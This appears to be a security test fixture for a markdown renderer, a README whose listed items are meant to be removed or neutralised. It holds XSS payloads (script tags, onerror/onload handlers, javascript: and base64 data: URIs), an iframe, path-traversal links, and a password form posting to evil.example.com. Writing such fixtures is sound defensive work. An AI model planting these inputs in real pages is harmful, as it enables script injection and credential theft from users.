# Security fixture

This README is hostile on purpose. Every item below must be removed or neutralised by the renderer.

<script>alert('script-tag')</script>

<img src="x.png" onerror="alert('onerror')">

[javascript link](javascript:alert('js-link'))

[data html link](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)

<a href="data:text/html,<script>alert(2)</script>">raw data link</a>

<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDMpPC9zY3JpcHQ+PC9zdmc+" alt="svg data">

<img src="data:image/png;base64,iVBORw0KGgo=" alt="png data">

![remote image](https://images.example.com/tracker.png)

<iframe src="https://evil.example.com/frame"></iframe>

<p style="position:fixed;top:0;left:0;width:100%;height:100%">styled overlay</p>

<form action="https://evil.example.com/collect" method="post"><input type="text" name="password"><button>Send</button></form>

<a href="rsrepo:/a/../../escape">author rsrepo escape</a>

<a href="//evil.example.com/x">scheme-relative link</a>

<object data="evil.swf"></object><embed src="evil.swf">

<svg onload="alert('svg-onload')"><circle r="5"/></svg>

<div onclick="alert('click')" id="app">id clash</div>

[relative link](docs/page.md) and [escape above root](../../outside.md) and [fragment](#security-fixture)

![relative image](svg-with-script.svg)

| col | value |
|-----|-------|
| a   | 1     |

- [x] done
- [ ] todo

```rust
fn main() {}
```
